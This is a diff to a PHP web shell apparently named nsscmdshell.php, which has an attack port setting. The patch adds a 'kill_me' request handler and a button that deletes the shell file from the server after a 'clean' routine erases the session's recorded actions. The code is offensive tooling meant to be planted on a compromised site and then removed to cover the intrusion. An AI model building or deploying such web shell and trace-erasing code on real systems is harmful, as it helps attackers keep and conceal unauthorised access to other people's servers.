@@ -145,6 +145,17 @@ $attackport = "8000";
             }
 
 if (is_get_request()){
+
+    if (isset($_GET['kill_me'])) {
+            if (!unlink ('nsscmdshell.php')){
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
+            }
+            else {
+             echo 'Success!<br>';
+            }
+
+    }
+
     if (isset($_GET['clean'])) {
         $cleans = $_SESSION['actions'];
         $alerts = "";
@@ -164,7 +175,7 @@ if (is_get_request()){
                 sleep(1);
                 if ($_SESSION['actions'] == NULL) {
                    ?>
-                   <div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p></div>
+                   <div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><form action="" method="get">Do you also want to delete nsscmdshell.php? <br><button name="kill_me">Delete nsccmdshell.php </button></form></div>
 <?php
                 }
             } else {
